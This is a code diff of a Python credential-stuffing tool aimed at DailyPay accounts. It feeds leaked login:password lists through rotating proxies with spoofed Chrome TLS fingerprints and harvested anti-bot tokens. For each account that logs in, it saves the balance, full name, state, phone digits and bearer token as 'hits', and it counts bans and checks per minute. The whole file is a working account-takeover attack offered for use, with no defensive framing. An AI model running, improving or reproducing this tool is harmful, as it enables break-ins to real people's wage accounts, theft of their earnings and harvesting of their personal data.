@@ -1,14 +1,15 @@
-import functools, sqlite3, tls_client, traceback, datetime, aiofiles, logging, asyncio, random, httpx, uuid, json, time, sys, os, re
+import functools, tls_client, traceback, datetime, aiofiles, logging, asyncio, random, httpx, uuid, json, time, sys, \
+	ctypes, re, os
 
 from config import *
 
 ##############################################################################
-logging.basicConfig(format=u'%(filename)s [LINE:%(lineno)d] #%(levelname)-8s [%(asctime)s]  %(message)s', level=logging.INFO)
+logging.basicConfig(format=u'%(filename)s [LINE:%(lineno)d] #%(levelname)-8s [%(asctime)s]  %(message)s',
+					level=logging.INFO)
 logging.getLogger('httpx').setLevel(logging.WARNING)
 
 lock = asyncio.Lock()
-conn = sqlite3.connect("tokens.db", check_same_thread=False) 
-cursor = conn.cursor()
+stats = {'cpm': 0, 'checked': 0, 'remaining': 0, 'hits': 0, 'bans': 0, 'custom': 0, 'fails': 0, 'to_check': 0, 'errors': 0, 'last_update_time': time.time(), 'requests_count': 0}
 ##############################################################################
 async def read_file(file_path: str, splitlines: bool = True):
 	file_text = await (await aiofiles.open(file_path, 'r', encoding='utf-8')).read()
@@ -27,11 +28,39 @@ async def remove_line_from_file(file_path: str, line_to_remove: str):
 		async with aiofiles.open(file_path, mode='w') as f:
 			await f.writelines(lines)
 
+def update_cpm():
+	current_time = time.time()
+	elapsed_time = current_time - stats['last_update_time']
+	stats['cpm'] = int(stats['requests_count'] // (elapsed_time / 60))
+	if elapsed_time >= 60:
+		stats['requests_count'] = 0
+		stats['last_update_time'] = current_time
+
+
+def update_title():
+	text = f"Daily Pay | CPM: {stats['cpm']} | Checked: {stats['checked']} | Remaining: {stats['remaining']} | Hits: {stats['hits']} | Custom: {stats['custom']} | Fails: {stats['fails']} | Bans: {stats['bans']} | Errors: {stats['errors']}"
+	ctypes.windll.kernel32.SetConsoleTitleW(text)
+
+def update_stats(key: str, value: int, final: bool = False) -> object:
+	if bool and key in 'bans:hits:custom:fails':
+		stats['checked'] += 1
+		stats['remaining'] -= 1
+	if key in 'hits:custom:fails':
+		stats['requests_count'] += 1
+	stats[key] += value
+	update_cpm()
+	update_title()
+
+
 
 class ProxyManager:
 	def __init__(self, proxy_path: str = None, proxies: list = []):
-		if proxy_path and os.path.exists(proxy_path): self.proxies_to_check = [x.strip() for x in list(set(open(proxy_path, 'r', encoding='utf-8').read().splitlines())) if x.strip() != '']
-		else: self.proxies_to_check = {proxy: 0 for proxy in proxies}
+		if proxy_path and os.path.exists(proxy_path):
+			self.proxies_to_check = [x.strip() for x in
+									 list(set(open(proxy_path, 'r', encoding='utf-8').read().splitlines())) if
+									 x.strip() != '']
+		else:
+			self.proxies_to_check = {proxy: 0 for proxy in proxies}
 		self.proxies = {}
 
 	def get_proxy(self, alr_formated: bool = True):
@@ -39,7 +68,8 @@ class ProxyManager:
 			min_usage_proxy = min(self.proxies, key=self.proxies.get)
 			self.proxies[min_usage_proxy] += 1
 			return {'http': min_usage_proxy, 'https': min_usage_proxy} if alr_formated else min_usage_proxy
-		except: return None
+		except:
+			return None
 
 	async def proxy_check_(self, proxy):
 		if '@' in proxy:
@@ -62,154 +92,172 @@ class ProxyManager:
 			futures.append(self.proxy_check_(proxy))
 		await asyncio.gather(*futures)
 
-class Spinner:
-	@staticmethod
-	async def spinner(text: str):
-		spinner = '|/-\\'
-		print(text, end=' ')
-		while True:
-			for cursor in spinner:
-				sys.stdout.write(cursor)
-				sys.stdout.flush()
-				await asyncio.sleep(0.1)
-				sys.stdout.write('\b')
-
-	@staticmethod
-	def start(text: str):
-		task = asyncio.create_task(Spinner.spinner(text))
-		return task
-	
-	@staticmethod
-	def stop(task):
-		try: task.cancel()
-		except: ...
-		sys.stdout.write('\r' + ' ' * 30 + '\r')
-		sys.stdout.flush()
-
-
-class SolverCapGuru:
-	def __init__(self, api_key: str):
-		self.api_key = api_key
-		self.session = httpx.AsyncClient()
-
-	async def create_task(self, site_key: str, captcha_url: str):
-		req = (await self.session.post('https://api.cap.guru/in.php', data={'key': self.api_key, 'method': 'userrecaptcha', 'googlekey': site_key, 'pageurl': captcha_url, 'json': 1})).json()
-		if req['status'] == 1:
-			task_id = req['request']
-		else:
-			print(f'[-] Ошибка при создании капчи: {req["request"]}')
-			task_id = None
-		return task_id
-
-	async def solve_recaptcha(self, site_key: str, captcha_url: str):
-		task_id = await self.create_task(site_key, captcha_url)
-		if not task_id: return None
-		print('[+] Решаю капчу')
-
-		while True:
-			await asyncio.sleep(5)
-			req = (await self.session.get('https://api.cap.guru/res.php', params={'key': self.api_key, 'action': 'get', 'id': task_id, 'json': 1})).json()
-
-			if req['status'] == 1:
-				recaptcha_token = req['request']
-				logging.debug(f'recaptcha_token: {recaptcha_token}')
-				return recaptcha_token
-			elif req['request'] == 'CAPCHA_NOT_READY':
-				continue
-			else:
-				print(f'[-] Ошибка при решении капчи: {req["request"]}')
-				return None
-		
-		await self.session.aclose()
 
 class CheckerClient:
-	def __init__(self, proxy_client: ProxyManager, solver):
+	def __init__(self, proxy_client: ProxyManager):
 		self.proxy_client = proxy_client
-		self.solver = solver
 		self.loop = asyncio.get_event_loop()
+		self.aclient = httpx.AsyncClient(timeout=60)
 
-	async def account_login(self, login: str, password: str):
-		session = tls_client.Session(client_identifier="chrome112", random_tls_extension_order=True)
-		session.proxies = self.proxy_client.get_proxy()
-		try:
-			req = await self.loop.run_in_executor(None, functools.partial(session.get, 'https://app.dailypay.com/login_password', headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'ru','cache-control': 'max-age=0','if-none-match': 'W/"ef8029dc9d612b75c8ecc7fea8d37726"','priority': 'u=0, i','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'}))
-			csrf = req.text.split('meta name="csrf-token" content="')[1].split('"')[0]
-			while True:
-				cursor.execute("SELECT token FROM tokens WHERE ? - timestamp <= 60 ORDER BY RANDOM() LIMIT 1", (int(datetime.datetime.now().timestamp()), ))
-				castle_token = cursor.fetchone()
+	async def get_castle_token(self):
+		while True:
+			try:
+				req = (await self.aclient.get('http://127.0.0.1:8000/token')).json()
+				castle_token = req.get('token', None)
+				user_agent = req.get('user-agent', None)
 				if not castle_token:
 					await asyncio.sleep(.5)
 					continue
-				castle_token = castle_token[0]
-				# print(csrf, '|', castle_token)
-	
-				req = await self.loop.run_in_executor(None, functools.partial(session.post, 'https://app.dailypay.com/sessions', data={"authenticity_token": csrf, "session[email]": login, "session[password]": password, "commit": "Continue", "castle_request_token": castle_token}, headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'ru','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://app.dailypay.com','priority': 'u=0, i','referer': 'https://app.dailypay.com/sessions','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'}, allow_redirects=True))
-				print(req)
-				if 'Incorrect access, please try again' in req.text:
-					print(f'[-] Invalid: {login}:{password}')
-					return False
-				elif req.status_code == 403:
-					await asyncio.sleep(1)
-					continue
-				break
+				return castle_token, user_agent
+			except httpx.ReadTimeout:
+				continue
+			except httpx.ReadError:
+				continue
 
-			print(req, req.headers)
-			token = str(req.headers['Location']).split('#access_token=')[1].split('&')[0]
-			req = await self.loop.run_in_executor(None, functools.partial(session.post, 'https://employees-api.dailypay.com/employee_bff/v2/dashboard_information', headers={'accept': '*/*','accept-language': 'ru','authorization': f'Bearer {token}','origin': 'https://account.dailypay.com','priority': 'u=1, i','referer': 'https://account.dailypay.com/','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'}))
-			req_json = req.json()
-			print(req)
-			print(req.json())
+	async def account_login(self, login: str, password: str, retry: bool = False):
+		session = tls_client.Session(client_identifier="chrome112", random_tls_extension_order=True)
+		session.proxies = self.proxy_client.get_proxy()
+		try:
+			(castle_token, csrf, success, last_error) = None, None, False, 'None'
+			for idx in range(3):
+				castle_token, user_agent = await self.get_castle_token()
+				headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://app.dailypay.com', 'priority': 'u=0, i', 'referer': 'https://app.dailypay.com/login_password', 'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="112", "Google Chrome";v="112"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent}
+				try:
+					req = await self.loop.run_in_executor(None, functools.partial(session.get,
+																				  'https://app.dailypay.com/login_password',
+																				  headers=headers, timeout_seconds=5))
+					csrf = req.text.split('meta name="csrf-token" content="')[1].split('"')[0]
+
+					data = {"authenticity_token": csrf, "session[email]": login, "session[password]": password, "commit": "Continue", "castle_request_token": castle_token}
+					req = await self.loop.run_in_executor(None,
+														  functools.partial(session.post, 'https://app.dailypay.com/sessions',
+																			data=data, headers=headers, allow_redirects=True,
+																			timeout_seconds=10))
+					if req.status_code == 403: continue
+					success = True
+					break
+				except Exception as e:
+					last_error = e
+					continue
+			if not csrf: raise IndexError
+			elif not success: raise last_error
+
+			if 'Incorrect access, please try again' in req.text:
+				update_stats('fails', 1)
+				return False
+			elif req.status_code == 403:
+				await write_to_file(accounts_path, f'{login}:{password}\n')
+				update_stats('bans', 1)
+				return False
+
+
+			token = str(req.url).split('#access_token=')[1].split('&')[0]
+			# print(token)
+			headers['Authorization'] = f'Bearer {token}'
+			while True:
+				try:
+					req = await self.loop.run_in_executor(None, functools.partial(session.get,
+																				  'https://employees-api.dailypay.com/employee_bff/v2/dashboard_information',
+																				  headers={'accept': '*/*','accept-language': 'ru','authorization': f'Bearer {token}','origin': 'https://account.dailypay.com','priority': 'u=1, i','referer': 'https://account.dailypay.com/','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': user_agent}))
+					if req.status_code == 404:
+						await write_to_file(custom_path, f'{login}:{password} | new_profile = True\n')
+						update_stats('custom', 1)
+						print(f'[+] Custom: {login}:{password} | new_profile = True')
+						return False
+					# print(f'{login}:{password}', req, req.url)
+					req_json = req.json()
+					# print(req)
+					# print(req.json())
+					break
+				except tls_client.exceptions.TLSClientExeption:
+					continue
+				except Exception as e:
+					print(f'[-] Error ({e}): {login}:{password}')
+					update_stats('errors', 1)
+					await write_to_file(accounts_path, f'{login}:{password}\n')
+					return False
 			balance = round(req_json['availableBalanceCents'] / 100, 2)
 			currency = req_json['currency']
 			first_name = req_json['firstName']
 			last_name = req_json['lastName']
 			state = req_json['stateOfResidence']
 
-			req = await self.loop.run_in_executor(None, functools.partial(session.post, 'https://employees-api.dailypay.com/graphql', headers={'accept': '*/*','accept-language': 'ru','authorization': f'Bearer {token}','content-type': 'application/json','credentials': 'include','origin': 'https://account.dailypay.com','priority': 'u=1, i','referer': 'https://account.dailypay.com/','sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36','x-app-bundle': 'com.DailyPay.DailyPay','x-app-version': 'undefined','x-castle-request-token': castle_token,'x-correlation-id': ''}, json={'operationName': 'testAuth','variables': {},'query': 'query testAuth {\n  employee {\n    id\n    __typename\n  }\n}\n'}))
-			print(req.headers)
-			print(req.json())
-			print(req)
-			is_challenge = req.headers.get('x-account-challenged', True)
-			phone = req.headers.get('x-phone-last-four', None)
+			headers['x-app-bundle'] = 'com.DailyPay.DailyPay'
+			headers['x-app-version'] = 'undefined'
+			headers['x-castle-request-token'] = castle_token
+			headers['x-correlation-id'] = ''
+			req = await self.loop.run_in_executor(None, functools.partial(session.post,
+																		  'https://employees-api.dailypay.com/graphql',
+																		  headers=headers,
+																		  json={'operationName': 'testAuth',
+																				'variables': {},
+																				'query': 'query testAuth {\n  employee {\n    id\n    __typename\n  }\n}\n'}))
+			# print(f'graphql-{login}:{password}', req, req.headers)
+			is_challenge = req.headers.get('X-Account-Challenged', True)
+			phone = req.headers.get('X-Phone-Last-Four', None)
 			if not is_challenge:
-				print('token', token)
+				await write_to_file(custom_path, f'{login}:{password}:{token}\n')
+				update_stats('custom', 1)
 
-			text = f'{login}:{password} | balance = [{balance} {currency}] | firstName = {first_name} | lastName = {last_name} | state = {state} | PhoneNumber = {phone}'
-			await write_to_file(valid_save_path, f'{text}\n')
+			text = f'{login}:{password} | balance = [{balance} {currency}] | firstName = {first_name} | lastName = {last_name} | state = {state.upper()} | PhoneNumber = {phone}'
+			await write_to_file(hits_save_path, f'{text}\n')
+			update_stats('hits', 1)
 			print(f'[+] Valid: {text}')
 			return True
-		except Exception as e:
-			raise
-			await write_to_file(recheck_save_path, f'{login}:{password}\n')
-			print(f'[-] Error: {e}')
+		except tls_client.exceptions.TLSClientExeption:
+			if retry:
+				await write_to_file(accounts_path, f'{login}:{password}\n')
+				update_stats('errors', 1)
+				return False
+			update_stats('bans', 1, True)
+			return await self.account_login(login, password, True)
+		except httpx.ConnectError:
+			await write_to_file(accounts_path, f'{login}:{password}\n')
+			update_stats('errors', 1)
+			print('SERVER IS NOT STARTED!!!')
 			return False
-
+		except TypeError:
+			await write_to_file(accounts_path, f'{login}:{password}\n')
+			update_stats('errors', 1)
+			return False
+		except IndexError:
+			if retry:
+				await write_to_file(accounts_path, f'{login}:{password}\n')
+				update_stats('errors', 1)
+				return False
+			update_stats('bans', 1, True)
+			return await self.account_login(login, password, True)
+		except Exception as e:
+			await write_to_file(accounts_path, f'{login}:{password}\n')
+			update_stats('errors', 1)
+			print(f'[-] Error ({type(e)}): {e}')
+			return False
 
 
 async def main():
 	proxy_client = ProxyManager(proxy_path=proxy_path)
 	await proxy_client.proxy_check()
-	if captcha_solver_service['CapGuru']: solver = SolverCapGuru(captcha_solver_key)
-	else: print('Вы не выбрали сервис для решения капчи!')
-	parser_client = CheckerClient(proxy_client=proxy_client, solver=solver)
+	parser_client = CheckerClient(proxy_client=proxy_client)
 
 	accounts = await read_file(accounts_path)
-	print(f'\n\nВсего аккаунтов в базе: {len(accounts)}')
-	print(f'Валидных прокси: {len(proxy_client.proxies)}\n\n\n')
+	print(f'\n\nThreads: {max_concurrent_tasks}\nAccounts: {len(accounts)}\nValid proxy: {len(proxy_client.proxies)}\n\n\n')
+	print(f'')
 
 	semaphore = asyncio.Semaphore(max_concurrent_tasks)
 
 	async def login_task(acc):
-		try: login, password = acc.split(':')
-		except: return
+		try:
+			login, password = acc.split(':')
+		except:
+			return await remove_line_from_file(accounts_path, acc)
 		async with semaphore:
 			await remove_line_from_file(accounts_path, acc)
 			await parser_client.account_login(login, password)
-
+	update_stats('remaining', len(accounts))
 	await asyncio.gather(*(login_task(acc) for acc in accounts))
-	await solver.session.aclose()
-	await write_to_file(accounts_path, '', 'w')
+	await parser_client.aclient.aclose()
 
 if __name__ == '__main__':
-	asyncio.run(main())
-	input('\nДля завершение нажмите Enter')
+	try: asyncio.run(main())
+	except KeyboardInterrupt: ...
+	input(f"Daily Pay | CPM: {stats['cpm']} | Checked: {stats['checked']} | Remaining: {stats['remaining']} | Hits: {stats['hits']} | Custom: {stats['custom']} | Fails: {stats['fails']} | Bans: {stats['bans']} | Errors: {stats['errors']}")
